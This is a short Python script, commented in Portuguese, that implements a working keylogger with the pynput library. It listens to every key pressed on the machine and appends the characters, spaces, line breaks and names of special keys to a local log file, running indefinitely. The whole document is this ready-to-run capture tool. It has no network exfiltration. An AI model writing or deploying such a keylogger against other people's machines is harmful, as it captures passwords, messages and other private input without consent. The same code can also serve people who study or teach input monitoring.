# Importando a biblioteca pynput, que nos permite monitorar os eventos do teclado
from pynput import keyboard

# Definindo o caminho para o arquivo onde as teclas pressionadas serão registradas
# Você deve substituir "caminho onde o arquivo foi salvo" pelo caminho real onde deseja salvar o arquivo
LOG_FILE_PATH = "caminho onde o arquivo foi salvo"


# Definindo a função que será chamada toda vez que uma tecla for pressionada
def on_key_press(key):
    # Abre (ou cria, se ainda não existir) o arquivo de log no modo de anexação ("a")
    # Isso significa que cada nova tecla pressionada será adicionada ao final do arquivo
    with open(LOG_FILE_PATH, "a") as log_file:
        # Tenta escrever o caractere da tecla pressionada no arquivo
        try:
            log_file.write(key.char)
        # Se a tecla pressionada não tiver uma representação de caractere (por exemplo, teclas como Shift, Ctrl, Alt),
        # esta exceção será acionada
        except AttributeError:
            # Se a tecla for a tecla de espaço, adiciona um espaço no arquivo
            if key == keyboard.Key.space:
                log_file.write(" ")
            # Se a tecla for a tecla Enter, adiciona uma nova linha no arquivo
            elif key == keyboard.Key.enter:
                log_file.write("\n")
            # Para todas as outras teclas sem uma representação de caractere,
            # adiciona o nome da tecla entre < > no arquivo
            else:
                log_file.write(f" <{key.name}> ")


# Garante que o código a seguir seja executado apenas se este script for executado diretamente
# e não quando importado como um módulo em outro script
if __name__ == "__main__":
    # Configura o listener do teclado para chamar a função on_key_press sempre que uma tecla for pressionada
    with keyboard.Listener(on_press=on_key_press) as listener:
        # Mantém o listener rodando indefinidamente
        listener.join()
